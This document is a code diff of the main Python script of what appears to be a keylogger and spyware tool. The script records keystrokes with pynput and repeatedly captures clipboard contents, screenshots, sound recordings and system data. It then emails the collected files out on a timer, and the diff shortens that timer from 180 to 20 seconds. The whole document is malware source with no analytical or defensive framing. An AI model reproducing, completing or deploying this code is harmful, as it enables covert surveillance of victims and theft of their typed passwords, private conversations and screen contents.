@@ -1,26 +1,17 @@
 #packages imports
-from pynput.keyboard import Listener
-import wave
+from pynput.keyboard import Listener, Key
 import sys
-from scipy.io.wavfile import write
 import threading
-import platform
-import psutil
-import GPUtil
-import socket
-import time, datetime
-import asyncio
+import datetime
 from cryptography.fernet import Fernet
 import http.client as httplib
 
 #modules imports
-sys.path.insert(0, './components')
-from components import clipboard, email, keyboard, screenshoot, sound, systemData
-
-
+sys.path.append('/../components')
+from components import clipboard, sound, screenshoot, keyboard, systemData, email
 
 Time = datetime.datetime.now()
-stoppingTime = Time + datetime.timedelta(seconds=180)
+stoppingTime = Time + datetime.timedelta(seconds=20)
 
 filePath: list = [
     "clipboard_file.txt",
@@ -30,39 +21,36 @@ filePath: list = [
     "soundrecord.wav"
 ]
 
-# getting the system version and info
+# keyboard listener
+def onRelease(key):
+    if (key == Key.esc):
+        return False
+    if (datetime.datetime.now()  > stoppingTime ):
+        return False
 
-
-
-
-listener = Listener(on_press=keyboard.onPress, on_release=keyboard.onRelease(stoppingTime))
+listener = Listener(on_press=keyboard.onPress, on_release=onRelease)
 listener.start()
-
-
-
-
 
 def final_func():
     global Time, stoppingTime
     if (datetime.datetime.now()) >= stoppingTime:
-        print("working HERE")
-        email.send_email(filePath)               
+        email.send_email(filePath)
         Time = datetime.datetime.now()
-        stoppingTime = Time + datetime.timedelta(seconds=180)
-        print(Time, stoppingTime)
+        stoppingTime = Time + datetime.timedelta(seconds=20)
 
 def setInterval(time):
     e = threading.Event()
     while not e.wait(time):
         if (datetime.datetime.now()) <= stoppingTime:
             count = str(datetime.datetime.now().timestamp()).split('.')[0]
-            clipboard.clipboard_func()
-            screenshoot.screenshot_func(count[8:10])
+            clipboard.clipboard()
+            screenshoot.screenshot_func()
             systemData.system_Data()
-            sound(time)
+            sound.sound(time)
         else:
+            print(datetime.datetime.now(), stoppingTime)
             final_func()
             setInterval(90)
             
-setInterval(90)
+setInterval(10)
 print("working")
